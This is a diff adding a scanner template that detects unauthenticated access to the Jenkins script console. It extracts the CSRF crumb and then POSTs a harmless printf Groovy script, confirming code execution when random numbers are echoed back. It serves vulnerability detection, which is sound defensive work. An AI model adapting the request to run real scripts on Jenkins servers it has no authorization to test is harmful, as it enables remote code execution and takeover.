@@ -1,0 +1,52 @@
+id: jenkins-script-unauth
+
+info:
+  name: Jenkins Unauthenticated Script Console Access
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    Detects unauthorized access to Jenkins script console, allowing arbitrary script execution.
+  reference:
+    - https://www.cnblogs.com/yuzly/p/11255609.html
+    - https://blog.51cto.com/13770310/2156663
+
+variables:
+  random1: "{{rand_int(1000, 9999)}}"
+  random2: "{{rand_int(1000, 9999)}}"
+  expected_result: "{{concat(random1, '%', random2)}}"
+
+http:
+  - id: check-access
+    method: GET
+    path:
+      - "{{BaseURL}}/script"
+    redirects: false
+    matchers:
+      - type: status
+        status:
+          - 200
+    extractors:
+      - type: regex
+        name: jenkins_crumb
+        group: 1
+        regex:
+          - "\\\"Jenkins-Crumb\\\", \\\"(?P<var>.+?)\\\"\\);"
+        internal: true
+
+  - id: execute-script
+    method: POST
+    path:
+      - "{{BaseURL}}/script"
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    body: |
+      script=printf%28%27{{random1}}%25%25{{random2}}%27%29%3B&Jenkins-Crumb={{jenkins_crumb}}&Submit=%E8%BF%90%E8%A1%8C
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "{{expected_result}}"
+        part: body
